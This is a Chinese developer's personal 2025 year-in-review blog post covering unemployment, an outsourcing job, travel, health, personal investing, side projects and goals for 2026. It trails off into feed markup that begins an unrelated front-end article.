<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3dd8fdcc6e424c3cb0ac3f854693dd50~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo5riK5ZCb:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768541628&amp;x-signature=gZW8Jr%2FaH81y%2FqdWqGD1OdWBI%2Fo%3D" alt="image" loading="lazy"/></p>
<p>然鹅并没有什么用, 回头过了下上半年写的内容, 每天写的最多的就是:</p>
<ul>
<li>去健身房</li>
<li>煮饭</li>
<li>没有面试机会</li>
<li>焦虑</li>
<li>今天又啥都没干</li>
<li>....</li>
</ul>
<p>是的失业这半年基本上也没干啥, 有面试机会就面试, 没有就宅家里和 “自律” 抗争...</p>
<p>最后自然也不会有出乎意料的结果, 破罐子破摔罢了。最后入职了一家外包公司, 主要是看给的薪资也还行就去了</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cb17ad9ba791431d9d05dea3cd168dbd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo5riK5ZCb:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768541628&amp;x-signature=WyooqhAYz5P%2FU2UzPw9PXdTESLk%3D" alt="image" loading="lazy"/></p>
<h2 data-id="heading-2">二、 外包这半年</h2>
<p>人生第一次外包工作, 好像也没想象🤔中那么差</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2919bb1adb004f88b698a9abb941f3bf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo5riK5ZCb:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768541628&amp;x-signature=5e0Lq5RAWcs1wsmvOdW2HAOqpPs%3D" alt="image" loading="lazy"/></p>
<p>有免费的零食吃、无限自助咖啡, 偶尔一天干它个三杯 😂)。过节也有各种礼盒、去了半年 T 恤、衣服、帽子、鼠标垫都不知道领了多少个了, 同时外包公司过节偶尔也有礼盒, 这过一次节领双份礼盒了都 👍</p>
<p>对了, 还有免费的早中晚餐。刚开始去还自己带饭, 后面杭州这边可以集体点餐了, 自此三餐就全包咯。晚餐不吃, 就带回去给对象, 第二天她带去公司当午饭吃, 一家人全靠公司养活了</p>
<p>唯一不好的就是得加班, 每天得 <code>8.30</code> 下班, 这样就更不想去健身了。下班到家都 <code>9</code> 点了, 如果去健身那么到家都得 <code>10</code> 点多了。不对, 还有就是没有年假, 这坑爹的外包公司必须入职满一年才给年假....</p>
<p>没有绩效压力, 纯牛马好像过得也挺爽的, 运气好的是还有机会接触到 <code>Agent</code> 相关的工作(虽然只是边缘的对接工作)</p>
<h2 data-id="heading-3">二、好好生活</h2>
<h3 data-id="heading-4">2.1 见家长</h3>
<p>人生进程 <code>+1</code>: <code>51</code> 去了对象老家, <code>10</code> 月份趁着周末带对象也回了趟我的老家, 一切都还挺顺利的。实际上好像也没想象中那么紧张, 在对象老家这一待就待了 <code>5</code> 天, 每天就是吃吃喝喝...</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/803dc192687a49e988992e3e67f803f9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo5riK5ZCb:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768541628&amp;x-signature=bzE9DC7wQQc9sXmcQqYb3ZUMPz8%3D" alt="image" loading="lazy"/></p>
<h3 data-id="heading-5">2.2 旅游</h3>
<p>上半年一直忙着工伤和工作的事, 下半年也一直在上班, 所以这一年也没去几个地方。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/627549749cb843a9a8e12ee4e4585021~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo5riK5ZCb:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768541628&amp;x-signature=a3LLvcB6Tr5qv6na6zgkdESet8w%3D" alt="image" loading="lazy"/></p>
<p>五月份大学舍长结婚, 就和对象一起去了趟福建, 之后就顺便就绕道去厦门玩了几天。厦门不错, 就是物价忒贵了, 如果去鼓浪屿千万自带吃食, 要不然就等着被宰吧。住的酒店就挺不错的, 服务周到、还有个大天台...</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/626e075b4df24786a3df12346aad2406~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo5riK5ZCb:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768541628&amp;x-signature=HEydnKwtN6Jd6qkFlCNHg%2FExt1c%3D" alt="image" loading="lazy"/></p>
<p>之后就是十月份, 去了心心念念的重庆。不愧是山城啊, 有被惊到, 刚去就按错电梯了 🐶。和美食荒漠的杭州相比, 那重庆简直是美食天堂了吧。可惜了, 上了年纪了真真感觉没以前能吃了, 一吃多肚子就难受得很....</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c564516eaff249658cff3779509ace74~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo5riK5ZCb:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768541628&amp;x-signature=QwyqmcmfkzrfAfcIeGntM0Gkqzk%3D" alt="image" loading="lazy"/></p>
<p>再之后又去了趟桐庐, 当然主要目的是对象在支付宝上白嫖了医美项目(只有那边能预约到), 顺带着就想着溜达溜达。景点就去了「石舍村」, 主要是淡季很多景点都闭园修整了, 在富春江溜达了两天就溜了, 江边一路风景倒是挺不错的。</p>
<h3 data-id="heading-6">2.3 健康</h3>
<p>是不是人一到 <code>30</code> 往后, 身体毛病就开始多起来了。 上半年差点不能入职了, 主要就是体检「心电图」有点异常, 吓坏了都。后面第二天又跑医院重新做了一次, 还是有一点点「异常」又补了其他检查, 最后没发现问题, 让医生开了个证明, 才顺利入职。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b51c1314cd774cca8f8270b7671d1338~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo5riK5ZCb:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768541628&amp;x-signature=q8bAWtnEOzzR8v9wcT60%2FVcNAsc%3D" alt="image" loading="lazy"/></p>
<p>可能是那几天生活作息不良引起的「心电图」波动, 但是那时才感觉真的老咯, 以前可不这样。并且还检查出血压偏高, 当然我血压偏高这事其实早就知道, 只是一直不重视而已。这次检查医生说我的一个心房好像偏大, 问是不是血压高, 我说是的, 然后就建议我吃药、减肥...</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f6907efff61a49e2a3e28e43c7ad7243~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo5riK5ZCb:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768541628&amp;x-signature=aHmEuvTfokDrpZLoZ09YqxLh04I%3D" alt="image" loading="lazy"/></p>
<p>好咯, 谨遵医嘱。 现在就是每天食用降压药, 还给自己安排上了血压仪。</p>
<p>后面就开始尝试减肥了, 到目前为止已瘦 <code>20</code> 斤吧。大部分都是前面几个月减下来的, 主要最开始上班都是自己带饭, 做的也干净(基本水煮), 所以瘦得还挺快的。</p>
<p>后面公司有免费的早中晚餐, 就放弃自己带饭咯。 慢慢的就反弹了点, 人啊一破防就容易破罐子破摔, 现在也不关注体重了, 现在估计又反弹不少....</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9e287bad1ca441268bf9a654e0215fa4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo5riK5ZCb:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768541628&amp;x-signature=ATZ%2FrRP6MdwbpT%2FQAQlGNSmVc24%3D" alt="image" loading="lazy"/></p>
<h3 data-id="heading-7">2.4 理财</h3>
<p>今年大家都回本了吧 🐶。 毕竟今年大 A 表现这么好, 再不回本也太说不过去了。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/97763142a71b46829ca2561d8e0b45cb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo5riK5ZCb:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768541628&amp;x-signature=dE62X26akT9HOWU2y4cEnDFCEg4%3D" alt="image" loading="lazy"/></p>
<p>今年我也可算回本了, 感谢大 A 🙇。往年我的理财账户是另一个支付宝, 只为了眼不见为净毕竟亏了那么多。今年做了个改变:</p>
<ul>
<li>将所有基金都转托管到常用的那个支付宝上</li>
<li>追求稳健、分散, 并卖掉亏损大的</li>
<li>大仓位放在债劵、固收、红利上</li>
<li>还配置了点纳指</li>
<li>最后只有一小部分放在科技上</li>
</ul>
<p>这种做法是稳, 但注定不能赚太多。在今年行情这么好的情况下, 今年收益也就 <code>8.25%</code> 远远跑输大盘。慢慢来吧, 起码今年的收益可以把我一年的房租给 <code>cover</code> 掉, 还是挺满意的。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5e0b938ff5094cf391cd6cb46a783e4b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo5riK5ZCb:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768541628&amp;x-signature=xd1H%2BVfSaWJWyeCsfgMh4Myzg5w%3D" alt="image" loading="lazy"/></p>
<p>今年半场还进了股市, 折腾了大半年, 小赚 <code>400</code> 大洋 😆。小资金, 玩得不亦说乎....</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e3a27a3aab634d73b7c6178b800abec2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo5riK5ZCb:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768541628&amp;x-signature=0ZJnv015m%2B8kOtgJ6UlQPGTTxIg%3D" alt="image" loading="lazy"/></p>
<p>今年黄金、白银也有点给力。黄金入场了, 可惜中场没拿住卖了, 后面又进场, 少赚了(虽然也没买多少)。后面白银出现套利的机会, 没整明白就瞎炒作, 导致耽误了好几天, 少套利了不少。我对象场外买了不少, 也因此错过了最高点(就差那么一天), 可惜了...</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ed1aa8f38bae4c419e7f303f17dd0abd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo5riK5ZCb:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768541628&amp;x-signature=SnTjV7fZDUVEWmuUalek3Rjls2E%3D" alt="image" loading="lazy"/></p>
<h3 data-id="heading-8">2.5 其他</h3>
<p>七月份大热天搬了个家, 在这小区已经换了三个窝了, 第一个主要是楼上太吵了, 第二个就是有点贵外加顶楼夏天实在是热得不行。</p>
<p>这一个也不知道能坚持多久呢, 主要问题就是二房东总是要房东催好几次才肯给他房租, 房东都找上我了让我催二房东给钱, 还说明年不租给他了 😭</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dd347e416352467a8874367bc2c8d0a9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo5riK5ZCb:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768541628&amp;x-signature=DfHgowO2%2Bcfu10InnjpfD9vPOHc%3D" alt="image" loading="lazy"/></p>
<p>双十二对象整了个烘干机, 那是真后悔没早点整, 简直太香了。特别是对我这种租房党, 晚上洗个衣服, 白天出门上班前把衣服丢烘干机就完事咯。主要还能收集灰尘和毛絮, 烘出来的衣服看起来就和新买的一样。强力推荐, 免去晒衣服的烦扰, 而且这样常年也只需要买 2~3 套衣服就行 🐶</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/02dcc702e959463e89c9d986f186ca4b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo5riK5ZCb:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768541628&amp;x-signature=bMz2W0l%2FcmNBp%2Fp%2Bf%2FeeyuoXFik%3D" alt="image" loading="lazy"/></p>
<p>两个崽: 妹妹越吃越胖、就像头猪; 姐姐倒是自律得很, 这一年身材管理起码比我好太多了, 没胖没瘦一切如旧。年初二狗子还了场病, 一直流鼻涕(怀疑是鼻炎), 被整的够呛的。还担心今年冬天会不会复发, 现在看着应该不会了吧, 对了这家伙年初应该还被俺们给噶了。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a8650dfe34a440d59050a71514034e88~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo5riK5ZCb:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768541628&amp;x-signature=EhM6A1CVN1TJozhRvav1Q6ZAoWA%3D" alt="image" loading="lazy"/></p>
<p>一年 <code>365</code> 天, 说长不长说短不短</p>
<p>翻翻照片总会有些收获的...</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b644fbac6b2d474787cc7b7c0e195652~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo5riK5ZCb:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768541628&amp;x-signature=k%2FEgJQzLNTgBZWbTtTbPnqNsskQ%3D" alt="image" loading="lazy"/></p>
<h2 data-id="heading-9">三、工作与成长</h2>
<h3 data-id="heading-10">3.1 工作</h3>
<p>新的工作, 工作难度一般吧, 反正轻松驾驭! 就是整体会更难? 或者说是更乱, 工期赶加上一群外包一起开发的项目, 虽然说有正式员工在把控, 但是项目质量也很难起来。正式员工也只是参与初期的项目开发, 后面的维护基本也就不管了, 毕竟只有新项目、新玩意才能出绩效。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e68578983dfe4e52bfd03d05c65e1fed~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo5riK5ZCb:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768541628&amp;x-signature=U%2FmkCL8wNF4BliTewFtH5a3RzPw%3D" alt="image" loading="lazy"/></p>
<p>但总的来说还是有点新东西可以学到, 毕竟不同的团队他们的开发习惯、开发范式都是不同的。总是能看到一些新玩意, 即便有些玩意个人也不太喜欢, 但是也是可以玩一玩的。</p>
<p>后面也有幸参与了 <code>vscode</code> 插件相关工作, 这里也涉及到  <code>Agent</code>, 虽然只是一些简单的对接工作, 但是我可以接触到 <code>Agent</code> 代码呀。明年一大目标就是好好研究研究大佬们写的代码, 应该是会有所收获的吧。</p>
<p>这大半年工作唯一的感受就是, 太多工作都没啥意义, 都是用一群人内卷换来一小撮人的自嗨罢了。但是又能咋样, 牛马嘛给钱就干。先把钱赚到了再说。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4a752c451abe443c890e2ed4de6d5a35~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo5riK5ZCb:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768541628&amp;x-signature=kLSy80SmKOd%2F9f5%2F7P%2BL50EMyZk%3D" alt="image" loading="lazy"/></p>
<h3 data-id="heading-11">3.2 读书 &amp; 播客</h3>
<p>今年相比去年阅读量少了些, 当然去年其实也没读多少书。书嘛, 都是随便瞎看的, 看过了 <code>26</code> 本书, 但真正看完的也就 <code>10</code> 本。本着先培养习惯的目的, 所以很多书看几眼不感兴趣也就不会强迫自己去读。也不会抱着太强的目的去看书, 也不要求一定会有啥收获。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6bc1a5edf8334172a462b41802bf5683~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo5riK5ZCb:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768541628&amp;x-signature=cMDJSoBTcVO1SaRD2g5V7b%2BRL9Y%3D" alt="image" loading="lazy"/></p>
<p>今年还入坑了博客, 平常做家务、坐地铁、撸铁、上班... 无聊时就会听听博客。大部分都是财经类的、科技类的, 再则就是几个脱口秀平台。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/26655b0652fe4138abe3ce7e0e448c73~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo5riK5ZCb:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768541628&amp;x-signature=rwkzevAxprlgH5kJT1bU%2FYPYae0%3D" alt="image" loading="lazy"/></p>
<h3 data-id="heading-12">3.3 开源? 独立作品</h3>
<p>今年 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FMoYuanJun" target="_blank" title="https://github.com/MoYuanJun" ref="nofollow noopener noreferrer">小绿点</a>还行, 出乎意料的多....</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2fe8c03c665943a2a77786cc99574a69~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo5riK5ZCb:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768541628&amp;x-signature=VrOYMPan8R%2Bf9YhKxF%2BU6xqrrnY%3D" alt="image" loading="lazy"/></p>
<p>今年主要新开了两个坑, 当然也都没有填上:</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FKunLunXu-CC%2FiLedger" target="_blank" title="https://github.com/KunLunXu-CC/iLedger" ref="nofollow noopener noreferrer">智账</a>: 一个记账的 <code>APP</code>, 为此还去研究了下 <code>React Native</code> 还输出了<a href="https://juejin.cn/column/7490753724082454579" target="_blank" title="https://juejin.cn/column/7490753724082454579">五篇博客</a>, 整了个<a href="https://juejin.cn/column/7490753724082454579" target="_blank" title="https://juejin.cn/column/7490753724082454579">专栏</a>, 实际上连项目都还没搭建起来, 就研究了下 <code>React Native</code></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FKunLunXu-CC%2Fwriteflow" target="_blank" title="https://github.com/KunLunXu-CC/writeflow" ref="nofollow noopener noreferrer">writeflow</a>: 基于 <a href="https://link.juejin.cn?target=https%3A%2F%2Fprosemirror.net%2F" target="_blank" title="https://prosemirror.net/" ref="nofollow noopener noreferrer">prosemirror</a> 写的一个富文本编辑器吧, 整体架构主要参考 <a href="https://link.juejin.cn?target=https%3A%2F%2Ftiptap.dev%2F" target="_blank" title="https://tiptap.dev/" ref="nofollow noopener noreferrer">Tiptap</a> 全当是学习了。之所以要写这么一个东西一为折腾, 二是 <a href="https://juejin.cn/post/6939698161116479496" target="_blank" title="https://juejin.cn/post/6939698161116479496">昆仑虚</a> 中文章编辑器用的是代码编辑器, 不是很方便想要换成富文本编辑器。</li>
</ul>
<p>其他的, <a href="https://juejin.cn/post/6939698161116479496" target="_blank" title="https://juejin.cn/post/6939698161116479496">昆仑虚</a> 今年应该也做了些调整, 没做记录也不知道改了啥, 也懒得查了, 就这样吧....</p>
<h3 data-id="heading-13">3.4 写文 &amp; 视频</h3>
<p>今天拢共就写了 <code>11</code> 篇文章, 主要还是发布在掘金、公众号上, 掘金上整体数据也就一般般吧。大部分都是上半年失业时闲得无聊写的, 下半年基本就荒废了, 毕竟当牛马的日子那么累, 谁还写文章啊 🐶</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/67c45190db5741bf8d64463c45f3a78c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo5riK5ZCb:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768541628&amp;x-signature=1XaMb5lEQxdzam7UXy4ix9YUgQs%3D" alt="image" loading="lazy"/></p>
<p>今年公众号粉丝从 <code>830</code> 到 <code>1394</code> 涨了 <code>500</code> 多吧, 主要也都是上半年涨的, 下半年也都没怎么更新了。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/72fcb2a096384688ab9c03f9ab08bbb5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo5riK5ZCb:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768541628&amp;x-signature=lGUdUAjy0CD%2B%2FMBP3temSU%2BSBM0%3D" alt="image" loading="lazy"/></p>
<p>对了, <a href="https://link.juejin.cn?target=https%3A%2F%2Fyoutu.be%2FJE4VCLy3SHg" target="_blank" title="https://youtu.be/JE4VCLy3SHg" ref="nofollow noopener noreferrer">油管</a>、<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.bilibili.com%2Fvideo%2FBV1WvjczKE5u%2F%3Fspm_id_from%3D333.1387.homepage.video_card.click" target="_blank" title="https://www.bilibili.com/video/BV1WvjczKE5u/?spm_id_from=333.1387.homepage.video_card.click" ref="nofollow noopener noreferrer">B 站</a>还发了一期视频, 配套文章 <a href="https://juejin.cn/post/7497435737051971594" target="_blank" title="https://juejin.cn/post/7497435737051971594">还原 Mac Dock 栏动效: 一步步打造流畅的波形缩放动画</a></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ad316558f9e1453395ee49647c8f3b64~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo5riK5ZCb:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768541628&amp;x-signature=nyCvno8NzvT4P4xxWkoEMKL%2BisY%3D" alt="image" loading="lazy"/></p>
<p>内容创作收入: 掘金金石 <code>300+</code>、公众号累计收入 <code>47</code></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2fff6c11ff94496b8919dd0ba6f4ef16~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo5riK5ZCb:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768541628&amp;x-signature=Od9ihh%2B3QGvKPYncEHl1Ujos6gA%3D" alt="image" loading="lazy"/></p>
<h2 data-id="heading-14">四、展望 2026</h2>
<p>照例, 定定 <code>2026</code> 目标, 至于能不能实现另说....</p>
<ul>
<li>
<p>好好生活</p>
<ul>
<li>身材管理(减肥、撸铁): 撸铁每周四次(下雨可以不去)、体重维持在 <code>80~82</code> (目前 <code>2025.12.31</code> 体重 <code>90</code>)</li>
<li>吃喝玩乐: 好好吃饭(不吃饱)、养生(少喝饮料)、多出去逛逛(去次新疆或韩国)</li>
<li>财务理财: 保护钱袋子、稳定理财(别浪)</li>
<li>人生体验: 整个人生第一辆小车(<code>10w</code> 左右)、人生大事安排起来、学习打网球</li>
</ul>
</li>
<li>
<p>工作与成长</p>
<ul>
<li>保住饭碗: 简历常更新(<code>6月</code>、<code>12月</code>)、保持学习</li>
<li>通过软考: 为了 <code>E 类人才</code>、为了买车</li>
<li><code>AI</code> 学习: 把公司 <code>Agent</code> 那一套研究明白、侧重应用端、<code>AI Coding</code> 技巧掌握</li>
<li>算法学习</li>
<li>多输出: 写文(每月 <code>2</code> 篇)、公众号(每月 <code>2</code> 篇)、视频(每月 <code>1</code> 个)</li>
<li>独立作品: 昆仑虚(增加两个 <code>APP</code>、开放注册)、智帐(完成开发)</li>
</ul>
</li>
<li>
<p>习惯养成:</p>
<ul>
<li>坚持写日记、做月度总结、季度总结</li>
<li>阅读: 每天 <code>30</code> 分钟, 微信读书打卡</li>
<li>早起(给自己找个活干)</li>
</ul>
</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[移动端长列表「返回原位置」的完整实践]]></title>    <link>https://juejin.cn/post/7592884480732266542</link>    <guid>https://juejin.cn/post/7592884480732266542</guid>    <pubDate>2026-01-09T03:13:18.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592884480732266542" data-draft-id="7592833068224593966" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="移动端长列表「返回原位置」的完整实践"/> <meta itemprop="keywords" content="前端,Vue.js,JavaScript"/> <meta itemprop="datePublished" content="2026-01-09T03:13:18.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="王小新_926"/> <meta itemprop="url" content="https://juejin.cn/user/2506542244438199"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            移动端长列表「返回原位置」的完整实践
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2506542244438199/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    王小新_926
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-09T03:13:18.000Z" title="Fri Jan 09 2026 03:13:18 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    5
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 